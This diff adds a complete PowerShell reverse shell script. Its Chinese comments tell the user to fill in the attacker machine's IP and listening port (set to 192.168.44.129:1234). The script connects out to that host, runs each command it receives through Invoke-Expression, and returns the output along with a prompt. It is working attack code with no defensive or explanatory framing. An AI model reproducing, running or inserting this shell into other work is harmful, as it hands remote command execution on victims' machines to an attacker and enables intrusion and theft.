@@ -1,0 +1,27 @@
+# 替换下面的 IP 和 PORT
+$ip = '192.168.44.129'      # 攻击机的IP地址
+$port = 1234                # 攻击机监听的端口
+
+$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+$stream = $client.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$buffer = New-Object Byte[] 1024
+$encoding = New-Object System.Text.ASCIIEncoding
+
+do {
+    $writer.Flush()
+    $read = $stream.Read($buffer, 0, 1024)
+    $command = $encoding.GetString($buffer, 0, $read)
+    $output = try {
+        Invoke-Expression $command 2>&1 | Out-String
+    } catch {
+        $_.Exception.Message
+    }
+    $output += 'PS ' + (Get-Location).Path + '> '
+    $outBuffer = $encoding.GetBytes($output)
+    $stream.Write($outBuffer, 0, $outBuffer.Length)
+} while ($client.Connected)
+
+$writer.Close()
+$stream.Close()
+$client.Close()
